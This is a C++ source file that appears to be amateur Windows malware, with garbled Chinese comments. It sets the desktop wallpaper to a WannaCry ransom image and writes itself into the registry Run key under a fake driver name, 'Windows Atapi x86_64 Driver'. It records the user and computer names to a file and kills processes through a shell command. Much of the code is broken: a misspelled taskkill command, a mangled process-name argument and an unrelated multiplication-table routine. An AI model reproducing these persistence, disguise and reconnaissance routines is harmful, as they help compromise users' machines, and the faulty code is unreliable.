#include "include/API.h"
#include "include/API-2.h"
ofstream ofs;
ifstream ifs;

string wstring2string(wstring wstr)
{
    string result;
    //��ȡ��������С��������ռ䣬��������С�°��ֽڼ����  
    int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
    char* buffer = new char[len + 1];
    //���ֽڱ���ת���ɶ��ֽڱ���  
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
    buffer[len] = '\0';
    //ɾ��������������ֵ  
    result.append(buffer);
    delete[] buffer;
    return result;
}


//����ϵͳ����
void system_information_table() {
    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry����.jpg";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
}


string text_box_auto() {
    string email_text_book = "�ɹ�ֲ��������";
    string email_text_neirong = "FTP����ʱ��������";
    return email_text_book+email_text_neirong;
}





void fstream_double(string username,string computer_name) {
	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
	ofs << "������û�����:" <<username<< endl;
	ofs << "�����ʶ������:" << computer_name << endl;
    ofs << "ϵͳ��Ϣ:" << endl;
    ofs << "CPUӲ����Ϣ:" << endl;
    ofs << "CPU-ID" << endl;
    ofs << "������Ϣ:" << endl;
    ofs << "���������ٶ�:" << endl;
    ofs << "���������ٶ�:" << endl;
	
}


//����������
string userlc;
//����������
void AutoStart()
{
    
    char Driver[MAX_PATH];
    HKEY hKey;
    string userlc = _pgmptr;
    string exe_name = "E-mail_text_false.exe";
    string ff_path = userlc + exe_name;
    cout << ff_path << endl;
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

//exepath
void exe_path() {
    cout << _pgmptr << endl;
}


//kill pro
void kill_process(string kill_name) {
    char kali_name=0;
    kill_name = kali_name;
    char message[1000];
    memset(message, 0, 200);
    char kill_target[] = "taskklii /f /t /im %c";
    sprintf_s(message, kill_target, kali_name);
    system(message);
}

//ifstream_open_read
void ifsteam_open_read() {
    ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
    if (!ifs.is_open())
    {
        cout << "�ļ���ʧ��" << endl;
        return;
    }
    char c;
    while ((c = ifs.get()) != EOF)
    {
        cout << c;
    }
    ifs.close();
}

//99_add_box
void nianty_add_box() {
    int i, j;
    for (i = 1; i <= 9; i++)
    {
        for (j = 1; j <= 9; j++)
        {
            if (i >= 10 - j)
            {
                cout << i << "*" << j << "=" << setw(2) << i * j << "  ";
            }
            else
            {
                cout << "        ";
            }
        }
        cout << endl;
    }
}

    